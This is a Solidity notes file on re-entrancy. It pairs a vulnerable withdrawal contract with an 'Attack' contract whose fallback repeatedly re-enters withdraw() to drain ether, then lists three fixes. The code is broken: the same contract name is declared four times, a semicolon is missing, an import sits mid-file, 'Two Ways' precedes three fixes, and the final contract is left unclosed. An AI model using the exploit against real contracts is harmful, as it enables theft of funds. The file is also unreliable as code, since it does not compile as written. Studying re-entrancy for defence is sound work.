// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

//Based on https://solidity-by-example.org/hacks/re-entrancy

contract ReentrantVulnerable {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    ReentrantVulnerable public reentrantVulnerable;

    constructor(address _reentrantVulnerableAddress){
        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerableAddress);
    }

    function attack() external payable {
        reentrantVulnerable.deposit{value:1 ether}();
        reentrantVulnerable.withdraw();
    }

    fallback() external payable {
        if(address(reentrantVulnerable).balance >= 1 ether){
            reentrantVulnerable.withdraw(); 
        }
    }
}


//How to fix Re-entrance attack (Two Ways)

//1
contract ReentrantVulnerable {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

         balances[msg.sender] = 0;  //Change the state of map to zero first then transfer the eth

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

//2 Mutex

contract ReentrantVulnerable {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    bool locked;

    function withdraw() public {
        require(!locked, "revert");
        locked = true
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
        locked = false;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

//3. Importing Openzeppline Re-entrancy guard - Using modifer nonReentrant
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract ReentrantVulnerable is ReentrancyGuard {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }


    function withdraw() public nonReentrant{
  
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
   
    }